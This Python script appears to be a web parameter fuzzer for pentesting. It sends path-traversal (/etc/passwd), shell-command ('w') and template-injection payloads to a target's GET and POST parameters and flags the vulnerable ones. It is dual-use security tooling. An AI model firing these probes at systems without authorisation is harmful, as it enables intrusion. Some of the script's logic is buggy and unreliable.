#!/usr/bin/env python3

import argparse
import sys
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import re
import threading
from queue import Queue
from cores.colors import green, end, info, bad, good, yellow, bold
from cores.utils import get_random_string

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", help="The URL to scan for vulnerabilities", dest="url")
parser.add_argument("-w", "--wordlist", help="The path to the wordlist you want to use", dest="wordlist", default="./db/short_params.txt")
parser.add_argument("-b", "--cookie", help="cookie", dest="cookie")
parser.add_argument("-t", "--threads", help="The number of threads to use when scanning", dest="num_threads", default="4")
args = parser.parse_args()
print_lock = threading.Lock()
q = Queue()
currentMethod = "GET" # Method for threads to refer to
num_threads = int(args.num_threads) # Defaults to 4 threads
values = ["../../../../../../../../etc/passwd", "w", "{{9999*9999}}"] # Values to fuzz: LFI, RCE, SSTTI
bypass_char = "" # For threads to refer to

url = args.url
wordlist = args.wordlist
cookie = args.cookie
args = parser.parse_args(args=None if sys.argv[1:] else ["--help"])

if cookie:
    headers = {
      "User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0",
      "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Language" : "en-US,en;q=0.5",
      "Accept-Encoding" : "gzip, deflate",
      "Connection" : "keep-alive",
      "Upgrade-Insecure-Requests" : "1",
      "Cookie": cookie
    }
else:
    headers = {
      "User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0",
      "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Language" : "en-US,en;q=0.5",
      "Accept-Encoding" : "gzip, deflate",
      "Connection" : "keep-alive",
      "Upgrade-Insecure-Requests" : "1"
    }

foundParams = {
  "rce":[],
  "lfi":[],
  "ssti":[]
}
paramList = []
try:
    with open(wordlist, "r", encoding="utf8") as file:
        for line in file:
            paramList.append(line.strip("\n"))
except FileNotFoundError:
    print(f"{bad} The file doesn't exist")
    quit()

def requester(url, method, data, headers):
    if method == "GET":
        response = requests.get(url, params=data, headers=headers ,verify=False)
    elif method == "POST":
        response = requests.post(url, data=data, headers=headers, verify=False)
    return response

# Parse web & get possible parameter in form
def parse(response):
    forms = re.findall(r"(?i)(?s)<form.*?</form.*?>", response)
    print(f"{good} Found possible parameters by parsing webpage: ", end="")
    for form in forms:
        if "input" in form.strip():
            names = re.findall(r"name=['\"](.*?)['\"]", form.strip())
            for name in names:
                if name not in paramList:
                    paramList.append(name)
                print("%s%s %s" % (bold, green, name), end=",")
    if not forms:
        print(f"{bad} No parameters found in webpage:")

def vulnerable(response, vuln):
    if vuln == "rce":
        if "jcpu" in response.lower():
            return True
        else:
            return False
    if vuln == "lfi":
        if "root:" in response.lower():
            return True
        else:
            return False
    if vuln == "ssti":
        if "99980001" in response.lower():
            return True
        else:
            return False

# checkParams iteration wrapped in one function
def checkUrlParams(url, param, method, values, originalLength):
    unknown_param_type = False
    for value in values:
        value = f"{value}{bypass_char}"
        data = { param: value }
        response = requester(url=url, method=method, data=data, headers=headers)
        if (len(response.text) != originalLength) and (response.status_code != 405):

            # RCE found
            if vulnerable(response.text, vuln="rce"):
                with print_lock:
                    print("%s Found valid param: %s%s %s%s(RCE!)%s"  % (good, green, param, bold, yellow, end))
                    foundParams["rce"].append(param)
                    unknown_param_type = False

            # SSTI found
            elif vulnerable(response.text, vuln="ssti"):
                with print_lock:
                    print("%s Found valid param: %s%s %s%s(SSTI!)%s"  % (good, green, param, bold, yellow, end))
                    foundParams["ssti"].append(param)
                    unknown_param_type = False

            # LFI found
            elif vulnerable(response.text, vuln="lfi"):
                with print_lock:
                    print("%s Found valid param: %s%s%s (%s?%s=%s)"  % (good, green, param, end, url,param, value))
                    foundParams["lfi"].append(param)
                    unknown_param_type = False
            else:
                unknown_param_type = True

    if unknown_param_type:
        with print_lock:
            print("%s Found valid param (This might be false positive): %s%s%s" % (info, green, param, end))

    with print_lock:
        print("%s Trying: %s" % (info,param), end="\r", flush=True)

# Threader function with receives param from Queue and originalLength
def threader(originalLength):
    while True:
        param = q.get()
        checkUrlParams(url, param, currentMethod, values, originalLength)
        q.task_done()

# Check GET & POST for all parameters found
def checkParams():
    global currentMethod
    currentMethod = "GET"
    # Check for GET method
    print(f"\n{good} Checking for GET request...")
    for _index, param in enumerate(paramList):
        q.put(param)
    q.join()

    # Check for POST method
    currentMethod = "POST"
    print(f"{good} Checking for POST request...")
    for param in paramList:
        q.put(param)
    q.join()

def intensive():
    # Loading bypassing wordlist
    bypass_chars = []
    with open("db/bypass_chars.txt", "r", encoding="utf8") as file:
        for line in file:
            bypass_chars.append(line.strip())
    for char in bypass_chars:
        print(f"{info} Trying with {char}")
        global bypass_char
        bypass_char = char
        checkParams()


if __name__ == "__main__":
    finalResult = []
    RCE = False
    LFI = False
    try:
        if url:
            if "http" not in url:
                url = f"http://{url}"
            try:
                originalFuzz = get_random_string(6)
                data = { originalFuzz: originalFuzz }
                response = requester(url=url, method="GET", data=data, headers=headers)
                # Parse webpage
                print(f"{good} Parsing webpage for potential parameters...")
                parse(response.text)
                originalLength = len(response.text)
                # Initialize threads
                for x in range(num_threads):
                    t = threading.Thread(target=threader, args=(originalLength,))
                    t.daemon = True
                    t.start()
                print(f"\n{info} Running with {num_threads} threads")
                # LFI and RCE checking
                checkParams()
                if not foundParams:
                    print(f"{info} No parameter found, trying bypassing techniques...")
                    intensive()
                else:
                    if len(foundParams["rce"]) > 0:
                        print(f"\n\n{good} Vulnerable parameters (RCE): ")
                        for param in foundParams["rce"]:
                            print("%s " % param)
                    if len(foundParams["lfi"]) > 0:
                        print(f"\n\n{good} Vulnerable parameters (LFI): ")
                        for param in foundParams["lfi"]:
                            print("%s " % param)
                    if len(foundParams["ssti"]) > 0:
                        print(f"\n\n{good} Vulnerable parameters (SSTI): ")
                        for param in foundParams["ssti"]:
                            print("%s " % param)
            except ConnectionError:
                print(f"{bad} Unable to connect to the target URL")
                quit()
    except KeyboardInterrupt:
        print(f"\n{bad} Exiting...")
        quit()
